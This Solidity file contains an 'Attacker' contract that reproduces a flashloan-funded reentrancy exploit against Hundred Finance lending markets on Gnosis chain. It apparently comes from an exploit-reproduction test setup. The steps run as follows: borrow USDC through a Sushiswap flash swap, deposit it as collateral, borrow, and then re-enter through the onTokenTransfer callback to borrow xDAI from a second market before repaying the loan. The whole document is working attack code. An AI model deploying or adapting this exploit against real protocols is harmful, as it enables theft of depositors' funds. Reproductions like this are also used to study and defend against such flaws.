// SPDX-License-Identifier: MIT

/**
1. Flashloan some funds --> Sushiswap pool USDC-WXDAI
2. Deposit those funds as collateral in Hundred Finance
3. Borrow against collateral in market A --> transfer triggers callback
4. Reenter protocol and borrow against collateral in market B
5. Swap tokens for the flashloaned tokens
6. Repay flashloan
 */

pragma solidity ^0.8.13;

import "@solmate/tokens/ERC20.sol";
import "@uniswap/v2-core/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-periphery/interfaces/IUniswapV2Router02.sol";
import "forge-std/console.sol";

interface ICompoundToken {
    function borrow(uint256 borrowAmount) external;
    function repayBorrow(uint256 repayAmount) external;
    function redeem(uint256 redeemAmount) external;
    function mint(uint256 amount) external;
    function comptroller() external view returns(address);
}

interface ICurve {
    function exchange(int128 i, int128 j, uint256 _dx, uint256 _min_dy) external;
}

interface IWETH {
    function deposit() external payable;
}

contract Attacker {
    ERC20 private immutable usdc;
    ERC20 private immutable wxdai;

    address private immutable husd;
    address private immutable hxdai;

    ICurve private immutable curve;
    IUniswapV2Router02 private immutable router;

    uint private totalBorrowed;
    bool private xdaiBorrowed;

    constructor(
        address _usdc,
        address _wxdai,
        address _husd,
        address _hxdai,
        address _curve,   // 3 pool on gnosis
        address _router  // sushi router on gnosis
    ) {
        usdc = ERC20(_usdc);
        wxdai = ERC20(_wxdai);
        husd = _husd;
        hxdai = _hxdai;
        curve = ICurve(_curve);
        router = IUniswapV2Router02(_router);
    }

    function attack() external {
        IUniswapV2Factory factory = IUniswapV2Factory(router.factory());
        // Pair USDC-WXDAI
        IUniswapV2Pair pair = IUniswapV2Pair(factory.getPair(address(wxdai), address(usdc)));

        uint borrowAmount = usdc.balanceOf(address(pair)) - 1;

        // DO FLASHLOAN
        pair.swap(
            pair.token0() == address(wxdai) ? 0 : borrowAmount,
            pair.token0() == address(wxdai) ? borrowAmount: 0,
            address(this),
            abi.encode("Some non 0 data")
        );

        console.log("Attacker USDC balance: %s usdc", usdc.balanceOf(address(this)));

        usdc.approve(husd, usdc.balanceOf(address(this)));
        ICompoundToken(husd).repayBorrow(usdc.balanceOf(address(this)));
    }

    function uniswapV2Call(
        address,
        uint amount0,
        uint amount1,
        bytes calldata
    ) external {
        uint amountToken = amount0 == 0 ? amount1 : amount0;
        totalBorrowed = amountToken;

        console.log("Borrowed %s USDC from Sushi", usdc.balanceOf(address(this)));

        depositUsdc();  // HUSDC -> IOU to my collateral
        borrowUsdc();  // borrow actual USDC against my HUSDC collateral, will trigger onTokenTransfer
        swapXdai();  // swap xdai for usdc on Curve

        // Repay flashloan
        uint amountRepay = amountToken * 1000 / 997 + 1;
        usdc.transfer(msg.sender, amountRepay);

        console.log("Repayed flashloan: %s USDC", amountRepay);
    }

    function depositUsdc() internal {
        uint balance = usdc.balanceOf(address(this));
        usdc.approve(husd, balance);
        
        ICompoundToken(husd).mint(balance);

        console.log("Attacker HUSDC balance after collateral deposit: %s HUSDC", ERC20(husd).balanceOf(address(this)));
    }

    function borrowUsdc() internal {
        uint amount = (totalBorrowed * 90) / 100;
        ICompoundToken(husd).borrow(amount);

        console.log("Attacker USDC balance after borrow: %s USDC", usdc.balanceOf(address(this)));
    }

    function borrowXdai() internal {
        xdaiBorrowed = true;
        uint amount = ((totalBorrowed * 1e12) * 60) / 100;

        ICompoundToken(hxdai).borrow(amount);

        console.log("Attacker xdai balance after borrow: %s XDAI", address(this).balance);
    }

    function swapXdai() internal {
        IWETH(payable(address(wxdai))).deposit{value: address(this).balance}();
        wxdai.approve(address(curve), wxdai.balanceOf(address(this)));
        curve.exchange(0, 1, wxdai.balanceOf(address(this)), 1);  // swaps wxdai for usdc
    }

    function onTokenTransfer(address from, uint256, bytes memory) external {
        console.log("onTokenTransfer");
        IUniswapV2Factory factory = IUniswapV2Factory(router.factory());
        address pair = factory.getPair(address(wxdai), address(usdc));

        if (from != pair && !xdaiBorrowed) {
            console.log("Reenter!");
            borrowXdai();
        }
    }

    receive() external payable {
        console.log("Received %s xdai", msg.value);
    }
}
